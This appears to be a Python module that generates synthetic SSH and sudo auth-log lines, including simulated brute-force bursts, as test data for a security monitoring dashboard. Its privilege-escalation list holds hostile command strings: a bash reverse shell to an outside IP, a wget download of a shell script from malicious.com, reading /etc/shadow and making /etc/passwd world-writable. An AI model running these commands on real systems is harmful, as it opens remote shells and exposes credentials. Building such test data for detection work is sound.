import random
import time
import logging
from datetime import datetime, timedelta
from pathlib import Path

logger = logging.getLogger(__name__)

VALID_USERS = ["emiliano", "admin", "deploy", "ubuntu", "root"]
INVALID_USERS = ["guest", "test", "oracle", "postgres", "pi",
                 "user", "ftpuser", "mail", "www-data", "mysql"]

INTERNAL_IPS = [
    "192.168.1.10", "192.168.1.15", "192.168.1.20",
    "10.0.0.5", "10.0.0.12"
]

ATTACK_IPS = [
    "45.33.32.156", "198.20.69.74", "80.82.77.139",
    "185.220.101.45", "94.102.49.190", "162.142.125.0",
    "167.248.133.0", "179.43.128.0"
]

NORMAL_IPS = [
    "200.68.128.1", "187.189.45.23", "201.134.56.78",
    "189.203.45.67", "148.243.12.34"
]


def timestamp_random(hours_back: int = 24) -> str:
    """Timestamp aleatorio dentro de las últimas N horas, formato /var/log/auth.log."""
    now = datetime.now()
    delta = timedelta(
        hours=random.randint(0, hours_back),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59)
    )
    return (now - delta).strftime("%b %d %H:%M:%S")


def generate_successful_login(ip: str, user: str, hostname: str) -> str:
    port = random.randint(49152, 65535)
    return (
        f"{timestamp_random()} {hostname} sshd[{random.randint(1000,9999)}]: "
        f"Accepted password for {user} from {ip} port {port} ssh2"
    )


def generate_failed_login(ip: str, user: str, hostname: str) -> str:
    port = random.randint(49152, 65535)
    return (
        f"{timestamp_random()} {hostname} sshd[{random.randint(1000,9999)}]: "
        f"Failed password for {user} from {ip} port {port} ssh2"
    )


def generate_invalid_user(ip: str, user: str, hostname: str) -> str:
    port = random.randint(49152, 65535)
    return (
        f"{timestamp_random()} {hostname} sshd[{random.randint(1000,9999)}]: "
        f"Invalid user {user} from {ip} port {port}"
    )


def generate_sudo_command(user: str, hostname: str, command: str) -> str:
    return (
        f"{timestamp_random()} {hostname} sudo[{random.randint(1000,9999)}]: "
        f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}"
    )


def generate_brute_force_attack(ip: str, hostname: str) -> list[str]:
    """Múltiples intentos fallidos desde la misma IP en poco tiempo."""
    logs = []
    user = random.choice(INVALID_USERS + VALID_USERS)
    attempts = random.randint(10, 25)
    for _ in range(attempts):
        logs.append(generate_failed_login(ip, user, hostname))
    return logs


def generate_normal_traffic(hostname: str) -> list[str]:
    """Actividad normal de un servidor."""
    logs = []
    ip = random.choice(INTERNAL_IPS + NORMAL_IPS)
    user = random.choice(VALID_USERS)

    logs.append(generate_successful_login(ip, user, hostname))

    if random.random() < 0.3:
        commands = ["/usr/bin/apt update", "/bin/systemctl restart nginx",
                    "/usr/bin/tail -f /var/log/syslog"]
        logs.append(generate_sudo_command(user, hostname, random.choice(commands)))

    return logs


def generate_privilege_escalation(hostname: str) -> list[str]:
    """Intento de escalada de privilegios vía sudo."""
    logs = []
    user = random.choice(VALID_USERS[1:])  # No root

    suspicious_commands = [
        "/usr/bin/chmod 777 /etc/passwd",
        "/bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1",
        "/usr/bin/wget http://malicious.com/shell.sh -O /tmp/shell.sh",
        "/bin/sh -c 'cat /etc/shadow'",
        "/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    ]
    logs.append(generate_sudo_command(
        user, hostname, random.choice(suspicious_commands)
    ))
    return logs


def write_logs(log_lines: list[str], filepath: Path) -> None:
    with open(filepath, "a", encoding="utf-8") as f:
        for line in log_lines:
            f.write(line + "\n")


def run_ssh_stream(
    hostname: str,
    output_file: Path,
    duration_seconds: int = 30,
    events_per_second: float = 3.0,
    attack_probability: float = 0.2,
    realtime: bool = False,
) -> Path:
    """
    Genera un stream de logs SSH/auth para un host.

    Args:
        realtime: si True, pausa entre ciclos como haría el log real
            (útil para demos en vivo). Si False, genera todo el lote
            de una vez — necesario para que el bootstrap del dashboard
            no tarde minutos con varios agentes/fuentes.
    """
    output_file.parent.mkdir(parents=True, exist_ok=True)

    total_cycles = max(1, int(duration_seconds * events_per_second))
    total_events = 0
    total_attacks = 0

    for _ in range(total_cycles):
        logs_to_write = []

        if random.random() < attack_probability:
            attack_type = random.choice(["brute_force", "privilege_escalation"])
            if attack_type == "brute_force":
                attack_ip = random.choice(ATTACK_IPS)
                logs_to_write.extend(generate_brute_force_attack(attack_ip, hostname))
            else:
                logs_to_write.extend(generate_privilege_escalation(hostname))
            total_attacks += 1
        else:
            logs_to_write.extend(generate_normal_traffic(hostname))

        write_logs(logs_to_write, output_file)
        total_events += len(logs_to_write)

        if realtime:
            time.sleep(1.0 / events_per_second)

    logger.info(
        f"[ssh] {hostname} | eventos={total_events} | ataques={total_attacks} | "
        f"archivo={output_file}"
    )
    return output_file
